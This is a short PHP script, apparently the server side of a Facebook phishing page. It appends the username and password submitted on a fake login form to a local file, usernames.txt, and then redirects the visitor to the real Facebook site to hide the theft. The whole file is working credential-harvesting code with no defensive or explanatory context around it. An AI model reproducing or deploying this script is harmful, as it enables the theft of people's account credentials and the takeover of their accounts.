<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
?>